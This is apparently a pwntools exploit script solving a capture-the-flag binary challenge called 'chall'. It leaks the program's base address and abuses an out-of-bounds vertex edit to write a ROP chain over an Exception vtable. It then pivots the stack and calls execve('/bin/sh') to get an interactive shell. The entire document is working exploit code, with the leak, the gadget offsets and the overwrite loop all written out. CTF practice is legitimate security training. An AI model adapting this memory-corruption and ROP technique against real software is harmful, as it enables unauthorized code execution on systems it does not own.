from pwn import *

p = process('./chall')
e = ELF('./chall')

def new(name, n):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Name: ', name)
    p.sendlineafter(b'vertices: ', str(n))
    for i in range(n):
        p.sendlineafter(b'= ', str((0, 0)))

def rename(old_name, new_name, yN):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'Name: ', old_name)
    p.sendlineafter(b'Name: ', new_name)
    p.sendlineafter(b']: ', yN)

def edit(name, i, v):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'Name: ', name)
    p.sendlineafter(b'Index: ', str(i))
    p.sendlineafter(b'= ', str(v))

# Leak
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'Name: ', b'A')
p.sendlineafter(b'vertices: ', b'0')
p.recvuntil(b'_Dmain [')
e.address = int(p.recvuntil(b']')[:-1], 16) - (e.symbols['_Dmain']+586)
log.info(hex(e.address))

# Reset
new(b'A', 3)
rename(b'A', b'A', b'N')

# 0x00000000000a459a : push rcx ; or byte ptr [rax - 0x75], cl ; pop rsp ; and al, 8 ; add rsp, 0x18 ; ret
# RCX = _D9Exception6__vtblZ
# _D9Exception6__vtblZ + 0x40 = _D6object9Throwable8toStringMxFMDFIAaZvZv
push_rcx_or_pop_rsp = 0xa459a + e.address
pop_rdi = 0x11f893 + e.address
pop_rsi_r15 = 0x11f891 + e.address
pop_rdx_xor_eax = 0x107c56 + e.address
pop_rax = 0xaa2cd + e.address
syscall = 0xd1ab1 + e.address

chain = [ 
    u64(b'/bin/sh\0'), pop_rdi,                 # _D9Exception6__vtblZ + 0x10
    e.symbols['_D9Exception6__vtblZ']+0x10, pop_rdx_xor_eax, 
    0, pop_rax, 
    push_rcx_or_pop_rsp, pop_rsi_r15, 
    0, 0, 
    pop_rax, 59, 
    syscall
]

# Overwrite
offset = 0x10
for i in chain:
    edit(b'A', (e.symbols['_D9Exception6__vtblZ']+offset)//8, (i&0xffffffff, i>>32))
    offset += 0x8

# Exception 
# Call _D6object9Throwable8toStringMxFMDFIAaZvZv -> Stack pivot to _D9Exception6__vtblZ + 0x18
p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'Name: ', b'B')

p.interactive()
